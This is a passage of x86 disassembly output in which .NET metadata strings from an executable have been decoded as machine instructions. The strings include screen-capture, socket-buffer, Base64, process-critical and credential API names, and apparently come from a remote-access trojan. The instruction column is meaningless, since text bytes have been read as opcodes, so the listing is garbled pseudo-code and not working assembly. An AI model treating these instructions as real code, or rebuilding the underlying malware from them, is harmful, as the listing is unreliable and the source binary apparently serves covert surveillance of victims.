  405f98:	6d                   	insl   (%dx),%es:(%edi)
  405f99:	65 41                	gs inc %ecx
  405f9b:	74 74                	je     0x406011
  405f9d:	72 69                	jb     0x406008
  405f9f:	62 75 74             	bound  %esi,0x74(%ebp)
  405fa2:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  405fa7:	75 67                	jne    0x406010
  405fa9:	67 65 72 48          	addr16 gs jb 0x405ff5
  405fad:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  405fb4:	74 
  405fb5:	72 69                	jb     0x406020
  405fb7:	62 75 74             	bound  %esi,0x74(%ebp)
  405fba:	65 00 4d 79          	add    %cl,%gs:0x79(%ebp)
  405fbe:	47                   	inc    %edi
  405fbf:	72 6f                	jb     0x406030
  405fc1:	75 70                	jne    0x406033
  405fc3:	43                   	inc    %ebx
  405fc4:	6f                   	outsl  %ds:(%esi),(%dx)
  405fc5:	6c                   	insb   (%dx),%es:(%edi)
  405fc6:	6c                   	insb   (%dx),%es:(%edi)
  405fc7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405fcc:	6e                   	outsb  %ds:(%esi),(%dx)
  405fcd:	41                   	inc    %ecx
  405fce:	74 74                	je     0x406044
  405fd0:	72 69                	jb     0x40603b
  405fd2:	62 75 74             	bound  %esi,0x74(%ebp)
  405fd5:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  405fd9:	74 65                	je     0x406040
  405fdb:	00 6d 5f             	add    %ch,0x5f(%ebp)
  405fde:	54                   	push   %esp
  405fdf:	68 72 65 61 64       	push   $0x64616572
  405fe4:	53                   	push   %ebx
  405fe5:	74 61                	je     0x406048
  405fe7:	74 69                	je     0x406052
  405fe9:	63 56 61             	arpl   %edx,0x61(%esi)
  405fec:	6c                   	insb   (%dx),%es:(%edi)
  405fed:	75 65                	jne    0x406054
  405fef:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  405ff3:	65 74 65             	gs je  0x40605b
  405ff6:	56                   	push   %esi
  405ff7:	61                   	popa
  405ff8:	6c                   	insb   (%dx),%es:(%edi)
  405ff9:	75 65                	jne    0x406060
  405ffb:	00 47 65             	add    %al,0x65(%edi)
  405ffe:	74 4f                	je     0x40604f
  406000:	62 6a 65             	bound  %ebp,0x65(%edx)
  406003:	63 74 56 61          	arpl   %esi,0x61(%esi,%edx,2)
  406007:	6c                   	insb   (%dx),%es:(%edi)
  406008:	75 65                	jne    0x40606f
  40600a:	00 47 65             	add    %al,0x65(%edi)
  40600d:	74 56                	je     0x406065
  40600f:	61                   	popa
  406010:	6c                   	insb   (%dx),%es:(%edi)
  406011:	75 65                	jne    0x406078
  406013:	00 53 65             	add    %dl,0x65(%ebx)
  406016:	74 56                	je     0x40606e
  406018:	61                   	popa
  406019:	6c                   	insb   (%dx),%es:(%edi)
  40601a:	75 65                	jne    0x406081
  40601c:	00 53 61             	add    %dl,0x61(%ebx)
  40601f:	76 65                	jbe    0x406086
  406021:	00 52 65             	add    %dl,0x65(%edx)
  406024:	63 65 69             	arpl   %esp,0x69(%ebp)
  406027:	76 65                	jbe    0x40608e
  406029:	00 73 65             	add    %dh,0x65(%ebx)
  40602c:	74 5f                	je     0x40608d
  40602e:	53                   	push   %ebx
  40602f:	65 6e                	outsb  %gs:(%esi),(%dx)
  406031:	64 42                	fs inc %edx
  406033:	75 66                	jne    0x40609b
  406035:	66 65 72 53          	data16 gs jb 0x40608c
  406039:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406040:	5f                   	pop    %edi
  406041:	52                   	push   %edx
  406042:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  406046:	76 65                	jbe    0x4060ad
  406048:	42                   	inc    %edx
  406049:	75 66                	jne    0x4060b1
  40604b:	66 65 72 53          	data16 gs jb 0x4060a2
  40604f:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  406056:	5f                   	pop    %edi
  406057:	4a                   	dec    %edx
  406058:	70 65                	jo     0x4060bf
  40605a:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40605e:	73 74                	jae    0x4060d4
  406060:	65 6d                	gs insl (%dx),%es:(%edi)
  406062:	2e 54                	cs push %esp
  406064:	68 72 65 61 64       	push   $0x64616572
  406069:	69 6e 67 00 61 64 64 	imul   $0x64646100,0x67(%esi),%ebp
  406070:	5f                   	pop    %edi
  406071:	53                   	push   %ebx
  406072:	65 73 73             	gs jae 0x4060e8
  406075:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40607c:	6e                   	outsb  %ds:(%esi),(%dx)
  40607d:	67 00 4e 65          	add    %cl,0x65(%bp)
  406081:	77 4c                	ja     0x4060cf
  406083:	61                   	popa
  406084:	74 65                	je     0x4060eb
  406086:	42                   	inc    %edx
  406087:	69 6e 64 69 6e 67 00 	imul   $0x676e69,0x64(%esi),%ebp
  40608e:	45                   	inc    %ebp
  40608f:	6e                   	outsb  %ds:(%esi),(%dx)
  406090:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406093:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40609a:	74 65                	je     0x406101
  40609c:	6d                   	insl   (%dx),%es:(%edi)
  40609d:	2e 44                	cs inc %esp
  40609f:	72 61                	jb     0x406102
  4060a1:	77 69                	ja     0x40610c
  4060a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4060a4:	67 2e 49             	addr16 cs dec %ecx
  4060a7:	6d                   	insl   (%dx),%es:(%edi)
  4060a8:	61                   	popa
  4060a9:	67 69 6e 67 00 49 73 	imul   $0x4c734900,0x67(%bp),%ebp
  4060b0:	4c 
  4060b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4060b2:	67 67 69 6e 67 00 46 	addr16 imul $0x6f724600,0x67(%bp),%ebp
  4060b9:	72 6f 
  4060bb:	6d                   	insl   (%dx),%es:(%edi)
  4060bc:	42                   	inc    %edx
  4060bd:	61                   	popa
  4060be:	73 65                	jae    0x406125
  4060c0:	36 34 53             	ss xor $0x53,%al
  4060c3:	74 72                	je     0x406137
  4060c5:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  4060cc:	61                   	popa
  4060cd:	73 65                	jae    0x406134
  4060cf:	36 34 53             	ss xor $0x53,%al
  4060d2:	74 72                	je     0x406146
  4060d4:	69 6e 67 00 43 6f 6d 	imul   $0x6d6f4300,0x67(%esi),%ebp
  4060db:	70 61                	jo     0x40613e
  4060dd:	72 65                	jb     0x406144
  4060df:	53                   	push   %ebx
  4060e0:	74 72                	je     0x406154
  4060e2:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  4060e9:	74 72                	je     0x40615d
  4060eb:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4060f2:	53                   	push   %ebx
  4060f3:	74 72                	je     0x406167
  4060f5:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4060fc:	73 74                	jae    0x406172
  4060fe:	72 69                	jb     0x406169
  406100:	6e                   	outsb  %ds:(%esi),(%dx)
  406101:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  406105:	73 74                	jae    0x40617b
  406107:	65 6d                	gs insl (%dx),%es:(%edi)
  406109:	2e 44                	cs inc %esp
  40610b:	72 61                	jb     0x40616e
  40610d:	77 69                	ja     0x406178
  40610f:	6e                   	outsb  %ds:(%esi),(%dx)
  406110:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  406114:	6d                   	insl   (%dx),%es:(%edi)
  406115:	70 75                	jo     0x40618c
  406117:	74 65                	je     0x40617e
  406119:	48                   	dec    %eax
  40611a:	61                   	popa
  40611b:	73 68                	jae    0x406185
  40611d:	00 46 6c             	add    %al,0x6c(%esi)
  406120:	75 73                	jne    0x406195
  406122:	68 00 67 65 74       	push   $0x74656700
  406127:	5f                   	pop    %edi
  406128:	45                   	inc    %ebp
  406129:	78 65                	js     0x406190
  40612b:	63 75 74             	arpl   %esi,0x74(%ebp)
  40612e:	61                   	popa
  40612f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  406133:	61                   	popa
  406134:	74 68                	je     0x40619e
  406136:	00 67 65             	add    %ah,0x65(%edi)
  406139:	74 5f                	je     0x40619a
  40613b:	57                   	push   %edi
  40613c:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  406143:	74 
  406144:	5f                   	pop    %edi
  406145:	4c                   	dec    %esp
  406146:	65 6e                	outsb  %gs:(%esi),(%dx)
  406148:	67 74 68             	addr16 je 0x4061b3
  40614b:	00 53 74             	add    %dl,0x74(%ebx)
  40614e:	61                   	popa
  40614f:	72 74                	jb     0x4061c5
  406151:	73 57                	jae    0x4061aa
  406153:	69 74 68 00 54 69 6d 	imul   $0x656d6954,0x0(%eax,%ebp,2),%esi
  40615a:	65 
  40615b:	72 43                	jb     0x4061a0
  40615d:	61                   	popa
  40615e:	6c                   	insb   (%dx),%es:(%edi)
  40615f:	6c                   	insb   (%dx),%es:(%edi)
  406160:	62 61 63             	bound  %esp,0x63(%ecx)
  406163:	6b 00 54             	imul   $0x54,(%eax),%eax
  406166:	72 61                	jb     0x4061c9
  406168:	6e                   	outsb  %ds:(%esi),(%dx)
  406169:	73 66                	jae    0x4061d1
  40616b:	6f                   	outsl  %ds:(%esi),(%dx)
  40616c:	72 6d                	jb     0x4061db
  40616e:	46                   	inc    %esi
  40616f:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  406176:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  406179:	52                   	push   %edx
  40617a:	74 6c                	je     0x4061e8
  40617c:	53                   	push   %ebx
  40617d:	65 74 50             	gs je  0x4061d0
  406180:	72 6f                	jb     0x4061f1
  406182:	63 65 73             	arpl   %esp,0x73(%ebp)
  406185:	73 49                	jae    0x4061d0
  406187:	73 43                	jae    0x4061cc
  406189:	72 69                	jb     0x4061f4
  40618b:	74 69                	je     0x4061f6
  40618d:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406190:	00 4e 65             	add    %cl,0x65(%esi)
  406193:	74 77                	je     0x40620c
  406195:	6f                   	outsl  %ds:(%esi),(%dx)
  406196:	72 6b                	jb     0x406203
  406198:	43                   	inc    %ebx
  406199:	72 65                	jb     0x406200
  40619b:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40619e:	74 69                	je     0x406209
  4061a0:	61                   	popa
  4061a1:	6c                   	insb   (%dx),%es:(%edi)
  4061a2:	00 53 79             	add    %dl,0x79(%ebx)
  4061a5:	73 74                	jae    0x40621b
  4061a7:	65 6d                	gs insl (%dx),%es:(%edi)
  4061a9:	2e 53                	cs push %ebx
  4061ab:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4061af:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4061b6:	6e 
  4061b7:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4061ba:	61                   	popa
  4061bb:	6c                   	insb   (%dx),%es:(%edi)
  4061bc:	00 57 69             	add    %dl,0x69(%edi)
  4061bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4061c0:	64 6f                	outsl  %fs:(%esi),(%dx)
  4061c2:	77 73                	ja     0x406237
  4061c4:	50                   	push   %eax
  4061c5:	72 69                	jb     0x406230
  4061c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4061c8:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4061cb:	61                   	popa
  4061cc:	6c                   	insb   (%dx),%es:(%edi)
  4061cd:	00 43 6f             	add    %al,0x6f(%ebx)
  4061d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4061d1:	64 69 74 69 6f 6e 61 	imul   $0x436c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  4061d8:	6c 43 
  4061da:	6f                   	outsl  %ds:(%esi),(%dx)
  4061db:	6d                   	insl   (%dx),%es:(%edi)
  4061dc:	70 61                	jo     0x40623f
  4061de:	72 65                	jb     0x406245
  4061e0:	4f                   	dec    %edi
  4061e1:	62 6a 65             	bound  %ebp,0x65(%edx)
  4061e4:	63 74 4e 6f          	arpl   %esi,0x6f(%esi,%ecx,2)
  4061e8:	74 45                	je     0x40622f
  4061ea:	71 75                	jno    0x406261
  4061ec:	61                   	popa
  4061ed:	6c                   	insb   (%dx),%es:(%edi)
  4061ee:	00 53 79             	add    %dl,0x79(%ebx)
  4061f1:	73 74                	jae    0x406267
  4061f3:	65 6d                	gs insl (%dx),%es:(%edi)
  4061f5:	2e 43                	cs inc %ebx
  4061f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4061f8:	6d                   	insl   (%dx),%es:(%edi)
  4061f9:	70 6f                	jo     0x40626a
  4061fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4061fc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4061fe:	74 4d                	je     0x40624d
  406200:	6f                   	outsl  %ds:(%esi),(%dx)
  406201:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  406204:	00 4c 61 74          	add    %cl,0x74(%ecx,%eiz,2)
  406208:	65 43                	gs inc %ebx
  40620a:	61                   	popa
  40620b:	6c                   	insb   (%dx),%es:(%edi)
  40620c:	6c                   	insb   (%dx),%es:(%edi)
  40620d:	00 6b 65             	add    %ch,0x65(%ebx)
  406210:	72 6e                	jb     0x406280
  406212:	65 6c                	gs insb (%dx),%es:(%edi)
  406214:	33 32                	xor    (%edx),%esi
  406216:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406219:	6c                   	insb   (%dx),%es:(%edi)
  40621a:	00 4e 54             	add    %cl,0x54(%esi)
  40621d:	64 6c                	fs insb (%dx),%es:(%edi)
  40621f:	6c                   	insb   (%dx),%es:(%edi)
  406220:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406223:	6c                   	insb   (%dx),%es:(%edi)
  406224:	00 63 6f             	add    %ah,0x6f(%ebx)
  406227:	72 65                	jb     0x40628e
  406229:	64 6c                	fs insb (%dx),%es:(%edi)
  40622b:	6c                   	insb   (%dx),%es:(%edi)
  40622c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40622f:	6c                   	insb   (%dx),%es:(%edi)
  406230:	00 53 68             	add    %dl,0x68(%ebx)
  406233:	65 6c                	gs insb (%dx),%es:(%edi)
  406235:	6c                   	insb   (%dx),%es:(%edi)
  406236:	00 50 6f             	add    %dl,0x6f(%eax)
  406239:	6c                   	insb   (%dx),%es:(%edi)
  40623a:	6c                   	insb   (%dx),%es:(%edi)
  40623b:	00 46 69             	add    %al,0x69(%esi)
  40623e:	6c                   	insb   (%dx),%es:(%edi)
  40623f:	65 53                	gs push %ebx
  406241:	74 72                	je     0x4062b5
  406243:	65 61                	gs popa
  406245:	6d                   	insl   (%dx),%es:(%edi)
  406246:	00 47 5a             	add    %al,0x5a(%edi)
  406249:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  406250:	6d                   	insl   (%dx),%es:(%edi)
  406251:	00 4d 65             	add    %cl,0x65(%ebp)
  406254:	6d                   	insl   (%dx),%es:(%edi)
  406255:	6f                   	outsl  %ds:(%esi),(%dx)
  406256:	72 79                	jb     0x4062d1
  406258:	53                   	push   %ebx
  406259:	74 72                	je     0x4062cd
  40625b:	65 61                	gs popa
  40625d:	6d                   	insl   (%dx),%es:(%edi)
  40625e:	00 67 65             	add    %ah,0x65(%edi)
  406261:	74 5f                	je     0x4062c2
  406263:	49                   	dec    %ecx
  406264:	74 65                	je     0x4062cb
  406266:	6d                   	insl   (%dx),%es:(%edi)
  406267:	00 53 79             	add    %dl,0x79(%ebx)
  40626a:	73 74                	jae    0x4062e0
  40626c:	65 6d                	gs insl (%dx),%es:(%edi)
  40626e:	00 53 79             	add    %dl,0x79(%ebx)
  406271:	6d                   	insl   (%dx),%es:(%edi)
  406272:	6d                   	insl   (%dx),%es:(%edi)
  406273:	65 74 72             	gs je  0x4062e8
  406276:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40627d:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  406284:	73 
  406285:	68 41 6c 67 6f       	push   $0x6f676c41
  40628a:	72 69                	jb     0x4062f5
  40628c:	74 68                	je     0x4062f6
  40628e:	6d                   	insl   (%dx),%es:(%edi)
  40628f:	00 52 61             	add    %dl,0x61(%edx)
  406292:	6e                   	outsb  %ds:(%esi),(%dx)
  406293:	64 6f                	outsl  %fs:(%esi),(%dx)
  406295:	6d                   	insl   (%dx),%es:(%edi)
  406296:	00 49 43             	add    %cl,0x43(%ecx)
  406299:	72 79                	jb     0x406314
  40629b:	70 74                	jo     0x406311
  40629d:	6f                   	outsl  %ds:(%esi),(%dx)
  40629e:	54                   	push   %esp
  40629f:	72 61                	jb     0x406302
  4062a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4062a2:	73 66                	jae    0x40630a
  4062a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4062a5:	72 6d                	jb     0x406314
  4062a7:	00 45 6e             	add    %al,0x6e(%ebp)
  4062aa:	75 6d                	jne    0x406319
  4062ac:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4062b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4062b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4062b2:	6c                   	insb   (%dx),%es:(%edi)
  4062b3:	65 61                	gs popa
  4062b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4062b6:	00 43 6f             	add    %al,0x6f(%ebx)
  4062b9:	70 79                	jo     0x406334
  4062bb:	46                   	inc    %esi
  4062bc:	72 6f                	jb     0x40632d
  4062be:	6d                   	insl   (%dx),%es:(%edi)
  4062bf:	53                   	push   %ebx
  4062c0:	63 72 65             	arpl   %esi,0x65(%edx)
  4062c3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4062c5:	00 67 65             	add    %ah,0x65(%edi)
  4062c8:	74 5f                	je     0x406329
  4062ca:	50                   	push   %eax
  4062cb:	72 69                	jb     0x406336
  4062cd:	6d                   	insl   (%dx),%es:(%edi)
  4062ce:	61                   	popa
  4062cf:	72 79                	jb     0x40634a
  4062d1:	53                   	push   %ebx
  4062d2:	63 72 65             	arpl   %esi,0x65(%edx)
  4062d5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4062d7:	00 53 79             	add    %dl,0x79(%ebx)
  4062da:	73 74                	jae    0x406350
  4062dc:	65 6d                	gs insl (%dx),%es:(%edi)
  4062de:	2e 43                	cs inc %ebx
  4062e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4062e1:	6d                   	insl   (%dx),%es:(%edi)
  4062e2:	70 6f                	jo     0x406353
  4062e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4062e5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4062e7:	74 4d                	je     0x406336
  4062e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4062ea:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4062ed:	2e 44                	cs inc %esp
  4062ef:	65 73 69             	gs jae 0x40635b
  4062f2:	67 6e                	outsb  %ds:(%si),(%dx)
  4062f4:	00 41 70             	add    %al,0x70(%ecx)
  4062f7:	70 44                	jo     0x40633d
  4062f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4062fa:	6d                   	insl   (%dx),%es:(%edi)
  4062fb:	61                   	popa
  4062fc:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  406303:	43                   	inc    %ebx
  406304:	75 72                	jne    0x406378
  406306:	72 65                	jb     0x40636d
  406308:	6e                   	outsb  %ds:(%esi),(%dx)
  406309:	74 44                	je     0x40634f
  40630b:	6f                   	outsl  %ds:(%esi),(%dx)
  40630c:	6d                   	insl   (%dx),%es:(%edi)
  40630d:	61                   	popa
  40630e:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  406315:	65 6d                	gs insl (%dx),%es:(%edi)
  406317:	2e 49                	cs dec %ecx
  406319:	4f                   	dec    %edi
  40631a:	2e 43                	cs inc %ebx
  40631c:	6f                   	outsl  %ds:(%esi),(%dx)
  40631d:	6d                   	insl   (%dx),%es:(%edi)
  40631e:	70 72                	jo     0x406392
  406320:	65 73 73             	gs jae 0x406396
  406323:	69 6f 6e 00 4d 79 41 	imul   $0x41794d00,0x6e(%edi),%ebp
  40632a:	70 70                	jo     0x40639c
  40632c:	6c                   	insb   (%dx),%es:(%edi)
  40632d:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  406334:	00 43 6f             	add    %al,0x6f(%ebx)
  406337:	70 79                	jo     0x4063b2
  406339:	50                   	push   %eax
  40633a:	69 78 65 6c 4f 70 65 	imul   $0x65704f6c,0x65(%eax),%edi
  406341:	72 61                	jb     0x4063a4
  406343:	74 69                	je     0x4063ae
  406345:	6f                   	outsl  %ds:(%esi),(%dx)
  406346:	6e                   	outsb  %ds:(%esi),(%dx)
  406347:	00 49 6e             	add    %cl,0x6e(%ecx)
  40634a:	74 65                	je     0x4063b1
  40634c:	72 61                	jb     0x4063af
  40634e:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  406352:	6e                   	outsb  %ds:(%esi),(%dx)
  406353:	00 53 79             	add    %dl,0x79(%ebx)
  406356:	73 74                	jae    0x4063cc
  406358:	65 6d                	gs insl (%dx),%es:(%edi)
  40635a:	2e 52                	cs push %edx
  40635c:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40635f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406364:	6e                   	outsb  %ds:(%esi),(%dx)
  406365:	00 4d 61             	add    %cl,0x61(%ebp)
  406368:	6e                   	outsb  %ds:(%esi),(%dx)
  406369:	61                   	popa
  40636a:	67 65 6d             	gs insl (%dx),%es:(%di)
  40636d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40636f:	74 4f                	je     0x4063c0
  406371:	62 6a 65             	bound  %ebp,0x65(%edx)
  406374:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  406378:	6c                   	insb   (%dx),%es:(%edi)
  406379:	6c                   	insb   (%dx),%es:(%edi)
  40637a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40637f:	6e                   	outsb  %ds:(%esi),(%dx)
  406380:	00 73 65             	add    %dh,0x65(%ebx)
  406383:	74 5f                	je     0x4063e4
  406385:	50                   	push   %eax
  406386:	6f                   	outsl  %ds:(%esi),(%dx)
  406387:	73 69                	jae    0x4063f2
  406389:	74 69                	je     0x4063f4
  40638b:	6f                   	outsl  %ds:(%esi),(%dx)
  40638c:	6e                   	outsb  %ds:(%esi),(%dx)
  40638d:	00 45 78             	add    %al,0x78(%ebp)
  406390:	63 65 70             	arpl   %esp,0x70(%ebp)
  406393:	74 69                	je     0x4063fe
  406395:	6f                   	outsl  %ds:(%esi),(%dx)
  406396:	6e                   	outsb  %ds:(%esi),(%dx)
  406397:	00 45 6e             	add    %al,0x6e(%ebp)
  40639a:	76 69                	jbe    0x406405
  40639c:	72 6f                	jb     0x40640d
  40639e:	6e                   	outsb  %ds:(%esi),(%dx)
  40639f:	00 67 65             	add    %ah,0x65(%edi)
  4063a2:	74 5f                	je     0x406403
  4063a4:	52                   	push   %edx
  4063a5:	65 61                	gs popa
  4063a7:	73 6f                	jae    0x406418
  4063a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4063aa:	00 67 65             	add    %ah,0x65(%edi)
  4063ad:	74 5f                	je     0x40640e
  4063af:	49                   	dec    %ecx
  4063b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4063b1:	66 6f                	outsw  %ds:(%esi),(%dx)
  4063b3:	00 4d 65             	add    %cl,0x65(%ebp)
  4063b6:	74 68                	je     0x406420
  4063b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4063b9:	64 49                	fs dec %ecx
  4063bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4063bc:	66 6f                	outsw  %ds:(%esi),(%dx)
  4063be:	00 46 69             	add    %al,0x69(%esi)
  4063c1:	6c                   	insb   (%dx),%es:(%edi)
  4063c2:	65 49                	gs dec %ecx
  4063c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4063c5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4063c7:	00 46 69             	add    %al,0x69(%esi)
  4063ca:	6c                   	insb   (%dx),%es:(%edi)
  4063cb:	65 53                	gs push %ebx
  4063cd:	79 73                	jns    0x406442
  4063cf:	74 65                	je     0x406436
  4063d1:	6d                   	insl   (%dx),%es:(%edi)
  4063d2:	49                   	dec    %ecx
  4063d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4063d4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4063d6:	00 4d 65             	add    %cl,0x65(%ebp)
  4063d9:	6d                   	insl   (%dx),%es:(%edi)
  4063da:	62 65 72             	bound  %esp,0x72(%ebp)
  4063dd:	49                   	dec    %ecx
  4063de:	6e                   	outsb  %ds:(%esi),(%dx)
  4063df:	66 6f                	outsw  %ds:(%esi),(%dx)
  4063e1:	00 43 6f             	add    %al,0x6f(%ebx)
  4063e4:	6d                   	insl   (%dx),%es:(%edi)
  4063e5:	70 75                	jo     0x40645c
  4063e7:	74 65                	je     0x40644e
  4063e9:	72 49                	jb     0x406434
  4063eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4063ec:	66 6f                	outsw  %ds:(%esi),(%dx)
  4063ee:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  4063f2:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  4063f7:	79 49                	jns    0x406442
  4063f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4063fa:	66 6f                	outsw  %ds:(%esi),(%dx)
  4063fc:	00 42 69             	add    %al,0x69(%edx)
  4063ff:	74 6d                	je     0x40646e
  406401:	61                   	popa
  406402:	70 00                	jo     0x406404
  406404:	53                   	push   %ebx
  406405:	6c                   	insb   (%dx),%es:(%edi)
  406406:	65 65 70 00          	gs gs jo 0x40640a
  40640a:	45                   	inc    %ebp
  40640b:	6e                   	outsb  %ds:(%esi),(%dx)
  40640c:	64 41                	fs inc %ecx
  40640e:	70 70                	jo     0x406480
  406410:	00 4d 44             	add    %cl,0x44(%ebp)
  406413:	35 43 72 79 70       	xor    $0x70797243,%eax
  406418:	74 6f                	je     0x406489
  40641a:	53                   	push   %ebx
  40641b:	65 72 76             	gs jb  0x406494
  40641e:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  406425:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  40642c:	72 
  40642d:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  406434:	64 65 72 00          	fs gs jb 0x406438
  406438:	54                   	push   %esp
  406439:	6f                   	outsl  %ds:(%esi),(%dx)
  40643a:	49                   	dec    %ecx
  40643b:	6e                   	outsb  %ds:(%esi),(%dx)
  40643c:	74 65                	je     0x4064a3
  40643e:	67 65 72 00          	addr16 gs jb 0x406442
  406442:	44                   	inc    %esp
  406443:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406447:	67 65 72 00          	addr16 gs jb 0x40644b
  40644b:	4d                   	dec    %ebp
  40644c:	61                   	popa
  40644d:	6e                   	outsb  %ds:(%esi),(%dx)
  40644e:	61                   	popa
  40644f:	67 65 6d             	gs insl (%dx),%es:(%di)
  406452:	65 6e                	outsb  %gs:(%esi),(%dx)
  406454:	74 4f                	je     0x4064a5
  406456:	62 6a 65             	bound  %ebp,0x65(%edx)
  406459:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40645d:	61                   	popa
  40645e:	72 63                	jb     0x4064c3
  406460:	68 65 72 00 53       	push   $0x53007265
  406465:	65 73 73             	gs jae 0x4064db
  406468:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40646f:	6e                   	outsb  %ds:(%esi),(%dx)
  406470:	67 45                	addr16 inc %ebp
  406472:	76 65                	jbe    0x4064d9
  406474:	6e                   	outsb  %ds:(%esi),(%dx)
  406475:	74 48                	je     0x4064bf
  406477:	61                   	popa
  406478:	6e                   	outsb  %ds:(%esi),(%dx)
  406479:	64 6c                	fs insb (%dx),%es:(%edi)
  40647b:	65 72 00             	gs jb  0x40647e
  40647e:	53                   	push   %ebx
  40647f:	79 73                	jns    0x4064f4
  406481:	74 65                	je     0x4064e8
  406483:	6d                   	insl   (%dx),%es:(%edi)
  406484:	2e 43                	cs inc %ebx
  406486:	6f                   	outsl  %ds:(%esi),(%dx)
  406487:	64 65 44             	fs gs inc %esp
  40648a:	6f                   	outsl  %ds:(%esi),(%dx)
  40648b:	6d                   	insl   (%dx),%es:(%edi)
  40648c:	2e 43                	cs inc %ebx
  40648e:	6f                   	outsl  %ds:(%esi),(%dx)
  40648f:	6d                   	insl   (%dx),%es:(%edi)
  406490:	70 69                	jo     0x4064fb
  406492:	6c                   	insb   (%dx),%es:(%edi)
  406493:	65 72 00             	gs jb  0x406496
  406496:	54                   	push   %esp
  406497:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  40649e:	55                   	push   %ebp
  40649f:	70 70                	jo     0x406511
  4064a1:	65 72 00             	gs jb  0x4064a4
  4064a4:	43                   	inc    %ebx
  4064a5:	75 72                	jne    0x406519
  4064a7:	72 65                	jb     0x40650e
